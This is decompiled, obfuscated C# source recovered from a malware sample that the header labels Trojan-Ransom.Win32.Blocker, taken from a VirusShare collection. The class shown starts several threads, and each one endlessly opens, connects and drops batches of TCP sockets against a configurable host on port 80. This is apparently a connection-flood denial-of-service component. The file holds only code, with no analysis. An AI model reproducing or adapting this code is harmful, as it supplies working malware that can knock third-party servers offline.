// Decompiled with JetBrains decompiler
// Type: .
// Assembly: N0ise, Version=0.0.0.0, Culture=neutral, PublicKeyToken=728989c32b6b09d5
// MVID: 91EA3868-EE8A-441B-BBED-0FA4D4EC628F
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00060-msil\Trojan-Ransom.Win32.Blocker.vmn-1e0c513253ecbc325a94a613272827d5c84824ce.exe

using \u0005;
using System;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Threading;

namespace \u0005
{
  internal class \u0003
  {
    private ThreadStart[] \u0001;
    private Thread[] \u0001;
    public string \u0001;
    private IPEndPoint \u0001;
    public bool \u0001;
    public int \u0001 = 80;
    public int \u0002 = 200;
    private \u0003.\u0001[] \u0001;
    public int \u0003 = 5;

    public void \u0002()
    {
      try
      {
        this.\u0001 = new IPEndPoint(\u0095.\u007E\u0001\u0004((object) \u0016\u0003.\u0094\u0003(this.\u0001))[0], this.\u0001);
      }
      catch
      {
        this.\u0001 = new IPEndPoint(\u001F\u0003.\u009E\u0003(this.\u0001), this.\u0001);
      }
      this.\u0001 = new Thread[this.\u0003];
      this.\u0001 = new ThreadStart[this.\u0003];
      this.\u0001 = new \u0003.\u0001[this.\u0003];
      for (int index = 0; index < this.\u0003; ++index)
      {
        this.\u0001[index] = new \u0003.\u0001(this.\u0001, this.\u0002);
        this.\u0001[index] = new ThreadStart(this.\u0001[index].\u0002);
        this.\u0001[index] = new Thread(this.\u0001[index]);
        \u000E\u0002.\u007E\u001C\u0002((object) this.\u0001[index]);
      }
      this.\u0001 = true;
    }

    public void \u0003()
    {
      for (int index = 0; index < this.\u0003; ++index)
      {
        try
        {
          \u000E\u0002.\u007E\u001D\u0002((object) this.\u0001[index]);
          this.\u0001[index] = (Thread) null;
          this.\u0001[index] = (ThreadStart) null;
          this.\u0001[index] = (\u0003.\u0001) null;
        }
        catch
        {
        }
      }
      this.\u0001 = false;
    }

    private class \u0001
    {
      private IPEndPoint \u0001;
      private Socket[] \u0001;
      private int \u0001;

      public \u0001([In] IPEndPoint obj0, [In] int obj1)
      {
        this.\u0001 = obj0;
        this.\u0001 = obj1;
      }

      public void \u0002([In] IAsyncResult obj0)
      {
      }

      public void \u0002()
      {
        while (true)
        {
          try
          {
            this.\u0001 = new Socket[this.\u0001];
            for (int index = 0; index < this.\u0001; ++index)
            {
              this.\u0001[index] = new Socket(\u001A\u0003.\u007E\u0095\u0003((object) this.\u0001), SocketType.Stream, ProtocolType.Tcp);
              \u0098.\u007E\u0007\u0004((object) this.\u0001[index], false);
              AsyncCallback asyncCallback = new AsyncCallback(this.\u0002);
              IAsyncResult asyncResult = \u0090\u0002.\u007E\u0010\u0004((object) this.\u0001[index], (EndPoint) this.\u0001, asyncCallback, (object) this.\u0001[index]);
            }
            \u000F\u0002.\u001F\u0002(100);
            for (int index = 0; index < this.\u0001; ++index)
            {
              if (\u0094.\u007E\u0008\u0004((object) this.\u0001[index]))
                \u0098.\u007E\u0011\u0004((object) this.\u0001[index], false);
              \u000E\u0002.\u007E\u000E\u0004((object) this.\u0001[index]);
              this.\u0001[index] = (Socket) null;
            }
            this.\u0001 = (Socket[]) null;
          }
          catch
          {
            for (int index = 0; index < this.\u0001; ++index)
            {
              try
              {
                if (\u0094.\u007E\u0008\u0004((object) this.\u0001[index]))
                  \u0098.\u007E\u0011\u0004((object) this.\u0001[index], false);
                \u000E\u0002.\u007E\u000E\u0004((object) this.\u0001[index]);
                this.\u0001[index] = (Socket) null;
              }
              catch
              {
              }
            }
          }
        }
      }
    }
  }
}
